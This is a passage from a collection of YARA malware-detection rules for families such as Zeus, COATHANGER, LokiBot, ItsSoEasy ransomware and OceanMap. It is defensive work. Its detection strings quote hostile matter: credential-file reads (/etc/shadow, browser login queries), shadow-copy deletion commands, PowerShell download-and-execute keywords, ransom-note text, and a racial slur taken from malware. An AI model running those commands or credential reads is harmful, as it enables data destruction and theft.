        yarahub_reference_md5 = "5a869577bc8122b96a3c8fdb26c2c10e"
        malpedia_family = "win.zeus"
    
    strings:
        $str1 = "*<input *value=\"" ascii
        $str2 = "*<option  selected" ascii
        $str3 = "*<select" ascii
        $str4 = "Ik{wvAapcgd1)%" ascii
        
    condition:
        all of them and
        uint16(0) == 0x5a4d
}


// ===== Source: yaraify-rules/Stealerium.yar =====
rule Stealerium {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-09-01"
        description = "Detects Stealerium Stealer"
        yarahub_uuid = "bbf5262c-8a7d-434d-a800-1254f1063921"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "96c62ca985ed966d7c6d274caa5bb41a"
        malpedia_family = "win.stealerium"
    
    strings:
        $GitHub = " https://github.com/kgnfth" ascii
        $StealeriumReport = " *Stealerium - Report:*" wide ascii

    condition:
        all of them and
        uint16(0) == 0x5a4d
}


// ===== Source: yaraify-rules/ELF_Implant_COATHANGER_Feb2024.yar =====
rule ELF_Implant_COATHANGER_Feb2024 {
    meta:
        Description = "Detects COTHANGER malware that spawns a BusyBox Reverse Shell "
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        Credits = "Is Now on VT! for the notification of malware sample"
        Reference = "https://www.ncsc.nl/binaries/ncsc/documenten/publicaties/2024/februari/6/mivd-aivd-advisory-coathanger-tlp-clear/TLP-CLEAR+MIVD+AIVD+Advisory+COATHANGER.pdf"
        Hash = "218a64bc50f4f82d07c459868b321ec0ef5cf315b012255a129e0bde5cc80320"
        date = "2024-02-23"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "8d0fffd6b8b127e0972e281c85fbf11c"
        yarahub_uuid = "a0b24c44-9d87-4886-b6bb-b709ab3aa67b"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $etc1 = "/etc/modules/%s"
        $etc2 = "/etc/shadow"
        $etc3 = "/etc/passwd"
        $etc4 = "/etc/shells"
        $etc5 = "/etc/gshadow"
        $etc6 = "/etc/hostid"
        $etc7 = "/etc/issue"
        $etc8 = "/etc/nologin"
        $etc9 = "/etc/motd"
        $etc10 = "/etc/network/if-%s.d"
        $etc11 = "/etc/ifplugd/ifplugd.action"
        $etc12 = "/etc/mactab"


        $conf1 = "/etc/man.config"
        $conf2 = "/etc/man_db.conf"
        $conf3 = "/etc/dnsd.conf"
        $conf4 = "/etc/udhcpd.conf"
        $conf5 = "/etc/ntp.conf"
        $conf6 = "/etc/inetd.conf"

        $bsybx1 = "busybox" nocase
        $bsybx2 = "/etc/busybox.conf"
        $bsybx3 = "busybox --show SCRIPT"
        $bsybx4 = "busybox --install [-s] [DIR]"

        $cmd1 = "--setgroups=allow and --map-root-user are mutually exclusive"
        $cmd2 = "tar -zcf /var/log/bootlog.tgz header %s *.log"
        $cmd3 = "cat /var/run/udhcpc.%iface%.pid"
        $cmd4 = "test -f /var/run/udhcpc.%iface%.pid"
        $cmd5 = "run-parts /etc/network/if-%s.d"
        $cmd6 = "/var/run/ifplugd.%s.pid"
        $cmd7 = "start-stop-daemon --stop -x wvdial -p /var/run/wvdial.%iface% -s 2"

        $httprsp1 = "HTTP/1.1 %u %s"
        $httprsp2 = "Content-type: %s"
        $httprsp3 = "WWW-Authenticate: Basic realm=\"%.999s\""
        $httprsp4 = "Location: %s/%s%s"
        $httprsp5 = "Content-Range: bytes %lu-%lu/%lu"
        $httprsp6 = "Accept-Ranges: bytes"
        $httprsp7 = "ETag: %s"
        $httprsp8 = "Content-Encoding: gzip"


    condition:
        6 of ($etc*)
        and 3 of ($conf*)
        and any of ($bsybx*)
        and 4 of ($cmd*)
        and all of ($httprsp*)
     
 }


// ===== Source: yaraify-rules/tofsee_yhub.yar =====
rule tofsee_yhub {
    meta:
        date = "2022-10-23"
        yarahub_uuid = "a2863cf2-6b6e-42e4-b78a-7e3fe72659ce"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "92e466525e810b79ae23eac344a52027"
        yarahub_author_twitter = "@billyaustintx"
        author = "Billy Austin"
        description = "Detects Tofsee botnet, also known as Gheg"
        malpedia_family = "Tofsee"
    strings:
        $s1 = "Too many errors in the block" ascii
        $s2 = "%OUTLOOK_BND_" ascii
        $s3 = "no locks and using MX is disabled" ascii
        $s4 = "mx connect error" ascii
        $s5 = "Too big smtp respons" ascii
        $s6 = "INSERT_ORIGINAL_EMAIL" ascii
        $s7 = "integr_nl = %d" ascii
        $s8 = "mail.ru" ascii
        $s9 = "smtp_herr" ascii
        $s10 = "%OUTLOOK_MID" ascii

    condition:
        uint16(0) == 0x5a4d and filesize < 200KB and 7 of ($s*)
}


// ===== Source: yaraify-rules/STRRAT.yar =====
rule STRRAT {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-04-28"
        description = "Detects STRRAT config filename"
        yarahub_uuid = "a8d86b9e-fd57-422c-9124-88bbfc9b75c7"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "5d16505a5abfcfc99095a676f1f0bd64"
        malpedia_family = "jar.strrat"
    
    strings:
        $config = "config.txt" ascii
        $str01 = "carLambo" ascii
        $str02 = "kingDavid" ascii
    
    condition:
        uint32(0) == 0x04034b50 and
        (($config) and
        any of ($str*))
}


// ===== Source: yaraify-rules/AHK_DarkGate_Payload_April_2024.yar =====
rule AHK_DarkGate_Payload_April_2024 {
    meta:
        author = "NDA0"
        date = "2024-04-16"
        description = "Detects .ahk payload dropped by DarkGate loader"
        yarahub_uuid = "79c4c50f-c927-445f-8620-04c094e01c35"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "958cd4a849145b96e92e63ef4e152349"
    strings:
        $NoTrayIcon = "#NoTrayIcon" ascii
        $AScript = "A_ScriptDir . \"\\test.txt\"" ascii
        $DllCallFunction = "DllCall(\"VirtualAlloc\", \"Ptr\", 0, \"UInt\", size, \"UInt\"" ascii
        $Loop = "Loop, % size {" ascii
        $NumPut = "NumPut" ascii
        $A_Index = "(A_Index - 1), \"Char\")" ascii
        $DllCall = "DllCall" ascii
    condition:
        $NoTrayIcon and $AScript and $DllCall and any of them
}


// ===== Source: yaraify-rules/ItsSoEasy_Ransomware_basic.yar =====
rule ItsSoEasy_Ransomware_basic {
    meta:
        description = "Detect basics of ItsSoEasy Ransomware (Itssoeasy-A)"
        author = "bstnbuck"
        date = "2023-11-02"
        yarahub_author_twitter = "@bstnbuck"
        yarahub_reference_link = "https://github.com/bstnbuck/ItsSoEasy"
        yarahub_uuid = "a2564e9f-e5f9-459c-ae4b-7656fa9df9c3"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "1ce280542553dc383b768b9189808e27"
        
    strings:
        $typ1 = "itssoeasy" nocase
        $typ1_wide = "itssoeasy" nocase wide
        $typ2 = "itssoeasy" base64
        $typ3 = "ItsSoEasy" base64
	
    condition:
        any of them
}


// ===== Source: yaraify-rules/Capability_Embedded_Lua.yar =====
rule Capability_Embedded_Lua : Embedded_Lua
{
    meta:
        author                       = "Obscurity Labs LLC"
        description                  = "Detects embedded Lua engines by looking for multiple Lua API symbols or env-var hooks"
        date                         = "2025-06-07"
        version                      = "1.0.0"
        yarahub_author_twitter       = "@obscuritylabs"
        yarahub_reference_md5        = "73e7e49b0803fc996e313e5284e103a6"
        yarahub_uuid                 = "90626ac0-e544-4d5b-b8c3-e70a7feb2b74"
        yarahub_license              = "CC BY-NC 4.0"
        yarahub_rule_matching_tlp    = "TLP:WHITE"
        yarahub_rule_sharing_tlp     = "TLP:WHITE"
        mitre_attack_tactic          = "TA0002"
        mitre_attack_technique       = "T1059.011"

    strings:
        // standard Lua environment-variable hooks
        $s_init      = "LUA_INIT"          ascii nocase
        $s_path      = "LUA_PATH"          ascii nocase

        // core Lua C-API functions / library loaders
        $a_new       = "luaL_newstate"     ascii nocase
        $a_openlibs  = "luaL_openlibs"     ascii nocase
        $a_loadbuf   = "luaL_loadbuffer"   ascii nocase
        $a_pcall     = "lua_pcall"         ascii nocase

        // any of the standard module openers, e.g. luaopen_base, luaopen_table, etc.
        $a_openmod   = /luaopen_[A-Za-z0-9_]+/ ascii nocase

    condition:
        // either an env-var hook...
        any of ($s_init, $s_path)

        // ... or a module-open pattern...
        or any of ($a_openmod)

        // ... or at least two core API functions (indicating they actually embed & use Lua)
        or (2 of ($a_new, $a_openlibs, $a_loadbuf, $a_pcall))
}


// ===== Source: yaraify-rules/EXE_Backdoor_OceanMap_March2024.yar =====
rule EXE_Backdoor_OceanMap_March2024 {
    meta:
        Description = "Detects Ocean Map Backdoor used by Russian Threat Group APT28"
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        Reference = "https://medium.com/@knight0x07/analyzing-apt28s-oceanmap-backdoor-exploring-its-c2-server-artifacts-db2c3cb4556b"
        File_Hash = "24fd571600dcc00bf2bb8577c7e4fd67275f7d19d852b909395bebcbb1274e04"
        date = "2024-03-27"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "5db75e816b4cef5cc457f0c9e3fc4100"
        yarahub_uuid = "f571852e-11a8-4d2f-ba3a-e19d82233db3"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.oceanmap"

    strings: 
        $pdb = "C:\\WORK\\Source\\tgnews\\tgnews\\obj\\x64\\Release\\VMSearch.pdb"

        $wide1 = "$ LOGIN"  fullword wide 
        $wide2 = "$ SELECT INBOX.Drafts"   fullword wide 
        $wide3 = "$ SELECT Drafts"  fullword wide 
        $wide4 = "$ UID SEARCH subject \""  fullword wide 
        $wide5 = "$ UID STORE"  fullword wide 
        $wide6 = "$ EXPUNGE"  fullword wide 
        $wide7 = "$ UID FETCH"  fullword wide

        $cmd1 = "taskkill /F /PID" fullword wide
        $cmd2 = "URL=file:///" fullword wide

        $get1 = "get_CurrentDomain" fullword
        $get2 = "get_OSVersion" fullword
        $get3 = "get_Location" fullword
        $get4 = "get_MachineName" fullword
        $get5 = "get_UserName" fullword
        $get6 = "GetProcessesByName" fullword
        $get7 = "get_FriendlyName" fullword
        $get8 = "get_Message" fullword
        $get9 = "get_Id" fullword

        $othr1 = "IndexOf" fullword
        $othr2 = "set_UseShellExecute" fullword
        $othr3 = "new_creds" fullword
        $othr4 = "new_r_creds" fullword
        $othr5 = "fcreds" fullword

    condition:
        uint16(0) == 0x5a4d
        and $pdb 
        or (
            3 of ($wide*)
            and any of ($cmd*)
            and 5 of ($get*)
            and 2 of ($othr*)
        )
 }


// ===== Source: yaraify-rules/BrainCipher.yar =====
rule BrainCipher {
    meta:
        author = "NDA0E"
	yarahub_author_twitter = "@NDA0E"
        date = "2024-10-17"
	description = "Detects BrainCipher Ransomware"
        yarahub_uuid = "b73e7c42-18de-4824-9537-6f9b36f7be71"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "71c109f3bf4da2fc0173b9bcff07e979"
    
    strings:
        $str0 = "Welcome to Brain Cipher Ransomware!" ascii
		
    condition:
        (uint16(0) == 0x5a4d or
	uint16(0) == 0x457f) and
	all of them
}


// ===== Source: yaraify-rules/EXE_ICS_IronGate_April2024.yar =====
rule EXE_ICS_IronGate_April2024 {
    meta:
        Description = "Detects Iron Gate ICS malware targeting simulation environment which appears to be a PoC"
       author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        Reference = "https://www.mandiant.com/resources/blog/irongate-ics-malware"
        File_Hash = "0539af1a0cc7f231af8f135920a990321529479f6534c3b64e571d490e1514c3"
        Info = "this YARA detects both the Dropper (EXE) and the final payload (DLL) for the Iron Gate malware "
        date = "2024-04-07"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "874f7bcab71f4745ea6cda2e2fb5a78c"
        yarahub_uuid = "636f11f2-9c55-42a8-a4ef-b8a5d2cc8b18"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $step1 = "Step7ConMgr.dll" wide fullword // malware searches for the legit DLL Step7ProSim and then renames it to this one
        $step2 = "Step7ProSim.COM" wide fullword 
        $step3 = "Step7ProSimProxy" wide fullword
        $step4 = "Step7ProSim.dll" wide fullword // when certain conditions are met, the malware will drop this malicious DLL

        $cmd1 = "WriteInputPoint" wide fullword
        $cmd2 = "ReadDataBlockValue" wide fullword
        $cmd3 = "WriteDataBlockValue" wide fullword
        $cmd4 = "ReadOutputPoint" wide fullword
        $cmd5 = "SetState" wide fullword
        

        $s71 = "Step7ProSim.dll" fullword
        $s72 = "IStep7ProSim" fullword
        $s73 = "Step7ProSim.Interfaces" fullword
        $s74 = "Step7ProSim" fullword

        $plcsim1 = "RunPlcSim" fullword
        $plcsim2 = "StartPLCSim" wide fullword

        $module1 = "ReadDataBlockSingle" fullword
        $module2 = "ReadDataBlockValue" fullword
        $module3 = "ReadOutputPoint" fullword
        $module4 = "WriteDataBlockSingle" fullword
        $module5 = "WriteDataBlockValue" fullword
        $module7 = "WriteInputPoint" fullword
        
        $playback1 = "waitBeforeRecordingTimeInMilliSeconds" fullword
        $playback2 = "waitBeforePlayingRecordsTimeInMilliSeconds" fullword
        $playback3 = "payloadExecutionTimeInMilliSeconds" fullword
        $playback4 = "waitBeforePlayingRecordsTimer" fullword
        $playback5 = "waitBeforeRecordingTimer" fullword
        $playback6 = "payloadExecutionTimer" fullword

        $dotnet1 = ".NETFramework,Version=v4.0"
        $dotnet2 = ".NET Framework 4"
        
    condition:
        uint16(0) == 0x5a4d
        and any of ($dotnet*)
        and any of ($step*)
        and 2 of ($cmd*)
        and any of ($plcsim*)
        and any of ($s7*)
        and 2 of ($module*)
        and 2 of ($playback*)
        and filesize < 1MB
        
 }


// ===== Source: yaraify-rules/CVE_2017_17215.yar =====
rule CVE_2017_17215 {
    meta:
	author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-10-27"
        description = "Detects exploitation attempt of CVE-2017-17215"
        yarahub_uuid = "bd62321c-ccb7-4d6b-b98a-740aec5a452c"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "a051d2730d19261621bd25d8412ba8e4"
	yarahub_reference_link = "https://nvd.nist.gov/vuln/detail/CVE-2017-17215"

    strings:
        $uri = "/ctrlt/DeviceUpgrade" ascii
        $digest_auth = "Digest username=" ascii
        $realm = "realm=\"" ascii
        $nonce = "nonce=" ascii
        $response = "response=" ascii

    condition:
        all of them
}


// ===== Source: yaraify-rules/telegram_bot_api.yar =====
rule telegram_bot_api {
    meta:
        author = "rectifyq"
        yarahub_author_twitter = "@_rectifyq"
        date = "2024-09-07"
        description = "Detects file containing Telegram Bot API"
        yarahub_uuid = "58c9e4fe-d1e9-46ed-913c-dba943ac16d6"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "9DA48D34DC999B4E05E0C6716A3B3B83"
    
    strings:
        $str1 = "api.telegram.org/bot" nocase
        $str2 = "api.telegram.org/bot" wide
        $str3 = "api.telegram.org/bot" xor
        
    condition:
        any of them
}


// ===== Source: yaraify-rules/win_phorpiex_a_84fc.yar =====
rule win_phorpiex_a_84fc {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-12-13"
        description               = "detects unpacked Phorpiex samples"
        hash_md5                  = "6b6398fa7d461b09b8652ec0f8bafeb4"
        hash_sha1                 = "43bf88ea96bb4de9f4bbc66686820260033cd2d7"
        hash_sha256               = "bd2976d327a94f87c933a3632a1c56d0050b047506f5146b1a47d2b9fd5b798d"
        malpedia_family           = "win.phorpiex"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "6b6398fa7d461b09b8652ec0f8bafeb4"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "84fc2940-d204-4d75-9f17-89cce6b1dea2"

    strings:
        $str_1 = ":--tLdr--:"
        $str_2 = "T-449505056674060607" wide

        $path_1 = "\\public_html" wide
        $path_2 = "\\htdocs" wide
        $path_3 = "\\httpdocs" wide
        $path_4 = "\\wwwroot" wide
        $path_5 = "\\ftproot" wide
        $path_6 = "\\share" wide
        $path_7 = "\\income" wide
        $path_8 = "\\upload" wide

        $cmd_0 = "/c start _ & _\\DeviceManager.exe & exit" wide
        $cmd_1 = "%ls\\_\\DeviceConfigManager.exe" wide
        $cmd_2 = "%ls\\_\\DeviceManager.exe" wide
        $cmd_3 = "/c rmdir /q /s \"%ls\"" wide
        $cmd_4 = "/c move /y \"%ls\", \"%ls\"" wide

    condition:
        uint16(0) == 0x5A4D and
        all of ($str*) or
        all of ($path*) or
        all of ($cmd*)
}


// ===== Source: yaraify-rules/Foudre_Backdoor.yar =====
rule Foudre_Backdoor {
   meta:
      description = "Detects Foudre Backdoor"
      author = "Sid"
      date = "2024-08-09"
      yarahub_uuid = "4c36d37f-9550-474e-aa55-fb154098462c"
      yarahub_license = "CC BY 4.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      yarahub_reference_md5 = "c45167396be510d5ee4da51ff7544d5e"

     strings:
      $s1 = "main.exe" fullword ascii
      $s2 = "pub.key" fullword ascii
      $s3 = "WinRAR self-extracting archive" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}


// ===== Source: yaraify-rules/IDATDropper.yar =====
rule IDATDropper {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-07-30"
        description = "Detects files containing embedded JavaScript; the JS executes a PowerShell command which either downloads IDATLoader in an archive, or an executable (not IDATLoader) which is loaded into memory. The modified PE will only run if it's executed as an HTML Application (.hta)."
        yarahub_uuid = "9dbff40b-6257-438d-8932-e7fb652a4d6a"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "db1ae063d1be2bcb6af8f4afb145cdc4"
        yarahub_reference_link = "https://cyble.com/blog/increase-in-the-exploitation-of-microsoft-smartscreen-vulnerability-cve-2024-21412/"
        malpedia_family = "win.emmenhtal"
    
    strings:
        $hta = "HTA:APPLICATION" ascii
        
        $script_start = "<script>" ascii
        $variable = "var " ascii
        $decode_from_charcode = "String.fromCharCode" ascii
        $script_end = "</script>" ascii
        
    condition:
        all of them
}


// ===== Source: yaraify-rules/MythStealer.yar =====
rule MythStealer
{
	meta:
		author = "Still"
		component_name = "MythStealer"
		date = "2025-06-13"
		description = "attempts to match the strings/instructions found in MythStealer"
		yarahub_author_twitter = "@AzakaSekai_"
		yarahub_license = "CC BY-NC 4.0"
		yarahub_reference_md5 = "3ed2ea6c74122b78b8ef83a0dcf6eb4c"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_uuid = "548efbd6-2db9-4420-a1ea-3e5210bd3aa5"
	strings:
		$module_parent_1 = "myth\\" ascii
		$module_parent_2 = "\\steal\\" ascii
		$module_parent_3 = "\\clipper\\" ascii
		$module_child_1 = "\\browser.rs" ascii
		$module_child_2 = "\\discord.rs" ascii
		$module_child_3 = "\\checks.rs" ascii
		$module_child_4 = "\\v20_decrypt.rs" ascii
		$str_1 = "orospu evladi.... " ascii
		$str_2 = "oh no: " ascii
		$str_3 = "OpenProcess failed. Likely missing SeDebugPrivilege.\n" ascii
		$str_4 = "error while decrypt v20" ascii
		$str_5 = "Error while sql connection" ascii
	condition:
		(
			2 of ($module_parent_*) and
			2 of ($module_child_*)
		) or
		3 of ($str_*)
}


// ===== Source: yaraify-rules/ItsSoEasy_Ransomware_Go_Var.yar =====
rule ItsSoEasy_Ransomware_Go_Var {
    meta:
		description = "Detect ItsSoEasy Ransomware (Itssoeasy-A Go.Var)"
		author = "bstnbuck"
		date = "2023-11-02"
        yarahub_author_twitter = "@bstnbuck"
        yarahub_reference_link = "https://github.com/bstnbuck/ItsSoEasy"
        yarahub_uuid = "e1115417-d183-472e-8156-6e3f070ef2e6"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "b4b6c316ba4285d42649026d38f9ea43"
    
	strings:
		$typ1 = "itssoeasy" nocase
		$typ1_wide = "itssoeasy" nocase wide
		$typ2 = "itssoeasy" base64
		$typ3 = "ItsSoEasy" base64

		// C2 communication message strings
		// well this sucks, ha!
		$c2m1 = "d2VsbCB0aGlzIHN1Y2tzLCBoYSE="  
		// has this idiot payed the ransom?               
		$c2m2 = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8="
		// oh, you're good!
		$c2m3 = "b2gsIHlvdSdyZSBnb29kIQ=="          
		// money, money, money!           
		$c2m4 = "bW9uZXksIG1vbmV5LCBtb25leSE="        
		// i need this to fuck you up!         
		$c2m5 = "aSBuZWVkIHRoaXMgdG8gZnVjayB5b3UgdXAh"   
		// --KEY-PROCEDURE--      
		$c2m6 = "LS1LRVktUFJPQ0VEVVJFLS0="                     
		
		// Base64 encoded message strings
		// Decrypt files now?
		$tkmsgMsg = "RGVjcnlwdCBmaWxlcyBub3c/"
		// Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
		$tkmsg1Msg = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0"
		// Now your data is lost
		$tkmsg2Msg = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0" 
		// It was as easy as I said, ha?
		$tkmsg3Msg = "SXQgd2FzIGFzIGVhc3kgYXMgSSBzYWlkLCBoYT8=" 

		// file names and typical ransom filetype
		$fileFiles = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0" // /if_you_change_this_file_your_data_is_lost
		// /identifier
		$fileident = "L2lkZW50aWZpZXI=" 
		// .itssoeasy                                        
		$filetype = "Lml0c3NvZWFzeQ==" 
		$fileransom = "itssoeasy.html"

		// CMD print messages
		$cmd1 = "Welcome to the Google connector!\nPlease wait while the installer runs..."
		$cmd2 = "Do not destroy the current process, otherwise your data will be irreversibly encrypted."
		$cmd3 = "Please use the instructions in the .html file on your Desktop or your Home-Directory to decrypt your data"
		$cmd4 = "If you payed, this window will automatically check and decrypt your data."
		$cmd5 = "Wow! You're good. Now i will recover your files!\n => Do not kill this process, otherwise your data is lost!"
		$cmd6 = "Your files has been decrypted!\nThank you and Goodbye."

    condition:
        any of ($typ*) and all of ($c2*, $tkmsg*, $file*, $cmd*) and (filesize > 2500KB and filesize < 6MB)
}


// ===== Source: yaraify-rules/Generic_FakeCaptchaPage.yar =====
rule Generic_FakeCaptchaPage {
	meta:
		author = "Still"
		component_name = "N/A"
		date = "2024-10-04"
		description = "attempts to match strings found in JavaScript/HTML used in captcha-styled malware delivery websites"
		yarahub_author_twitter = "@AzakaSekai_"
		yarahub_license = "CC BY-NC 4.0"
		yarahub_reference_md5 = "BBA238F9275043DCD71F4FD681A1D8D5"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_uuid = "e4e0690f-eb92-4f32-a4af-d78918898c9e"
	strings:
		$str_1 = "recaptchaPopup" ascii fullword
		$str_2 = "verifyButton" ascii fullword
		$str_3 = "const tempTextArea" ascii fullword
		$str_4 = "Verify You Are Human" ascii fullword
		$str_5 = "CTRL + V" ascii fullword
	condition:
		3 of them
}


// ===== Source: yaraify-rules/LokiPWS.yar =====
rule LokiPWS {
    meta:
        author = "NDA0E"
	yarahub_author_twitter = "@NDA0E"
	date = "2024-10-20"
        description = "Detects LokiBot"
	yarahub_uuid = "d40652f1-a047-44ed-b00f-8e3321d7ed07"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6746fbb343ddec70416177f77ef83c2a"
        malpedia_family = "win.lokipws"
    
    strings:
        $str0 = "SELECT encryptedUsername, encryptedPassword, formSubmitURL, hostname FROM moz_logins" ascii
        $str1 = "%s%s\\Login Data" wide ascii
	$str2 = "sqlite3.dll" wide ascii		
        
    condition:
        uint16(0) == 0x5a4d and 
        all of them
}


// ===== Source: yaraify-rules/Sus_CMD_Powershell_Usage.yar =====
rule Sus_CMD_Powershell_Usage
{
    meta:
        author = "XiAnzheng"
        source_url = "https://github.com/XiAnzheng-ID/RansomPyShield-Antiransomware"
        description = "May Contain(Obfuscated or no) Powershell or CMD Command that can be abused by threat actor(can create FP)"
        date = "2025-06-01"
        updated = "2025-06-01"
        yarahub_license = "CC0 1.0"
        yarahub_uuid = "68ec99c5-f2a0-4da7-93d9-58bf7cec9880"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "aa00661ab05eddcb50573492e722f1c8"

    strings:
        //Powershell Usage
        $ps1 = "-ExecutionPolicy Bypass" ascii wide nocase
        $ps2 = "Invoke-Expression" ascii wide nocase
        $ps3 = "IEX " ascii wide nocase
        $ps4 = ");IEX " ascii wide nocase
        $ps5 = "IEX;" ascii wide nocase
        $ps6 = "DownloadString" ascii wide nocase
        $ps7 = "FromBase64String" ascii wide nocase
        $ps8 = "New-Object Net.WebClient" ascii wide nocase
        $ps9 = "Invoke-WebRequest" ascii wide nocase

        //Possibly Encoded/Obfuscated command
        $obf1 = /-join\s*\(/ nocase 
        $obf2 = /-replace\s*\(/ nocase
        $obf3 = /\[char\]\d+/ nocase  
        $obf4 = /fromcharcode/ nocase

        //Windef
        $def1= "MpPreference" ascii wide nocase
        $def2= "Set-MpPreference" ascii wide nocase
        $def3= "Add-MpPreference" ascii wide nocase
        $def4= "WinDefend" ascii wide nocase
        $def5= "Defender" ascii wide nocase
        $def6= "MpCmdRun" ascii wide nocase
        $def7= "MpCmdRun.exe" ascii wide nocase
        $def8= "SECURITY CENTER" ascii wide nocase
        $def9= "Windows Security" ascii wide nocase
        $def10= "Quarantine" ascii wide nocase

        //Utility Abuse
        $util1 = "vssadmin delete shadows" ascii wide nocase
        $util2 = "bcdedit /set" ascii wide nocase
        $util3 = "wbadmin delete catalog" ascii wide nocase
        $util4 = "wmic shadowcopy delete" ascii wide nocase
        $util5 = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr" ascii wide nocase
        $util6 = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableCMD" ascii wide nocase
        $util7 = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools" ascii wide nocase
        $util8 = "taskkill /f" ascii wide nocase
        $util9 = "explorer.exe" ascii wide nocase
        $util10 = "rundll32" ascii wide nocase

    condition:
        (any of ($obf*))
        or (any of ($ps*))
        or (2 of ($def*))
        or (2 of ($util*))
}


// ===== Source: yaraify-rules/botnet_Vixaati.yar =====
rule botnet_Vixaati {
    meta:
        author = "NDA0E"
        date = "2024-07-22"
	description = "Vixaati botnet"
        yarahub_uuid = "dfba00d2-e090-4db5-b7b8-fd0a65185cec"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6dde652b28f73f978e834412b835a740"
    strings:
	$VixaatiServices = "VixaatiServices Pain SRC runs your shit niggaaaa lol xdxdxdxd" ascii
	$Vixaati = "Vixaati" ascii
    condition: 
	uint16(0) == 0x457f and all of them
}


// ===== Source: yaraify-rules/DarkTortilla_Installer.yar =====
rule DarkTortilla_Installer
{
	meta:
		author = "Still"
		component_name = "N/A"
		date = "2025-01-11"
		malpedia_family = "win.darktortilla"
		yarahub_author_twitter = "@AzakaSekai_"
		yarahub_license = "CC BY-NC 4.0"
		yarahub_reference_md5 = "CE23E784C492814093F9056ABD00080F"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_uuid = "0bff8b1c-2fbc-451b-b9cd-999c5365f163"
		description = "Matches DarkTortilla installer strings/bytecode"
	strings:
		$str_1 = "%Compress%" ascii fullword
		$str_2 = "%InjectionPersist%" ascii fullword
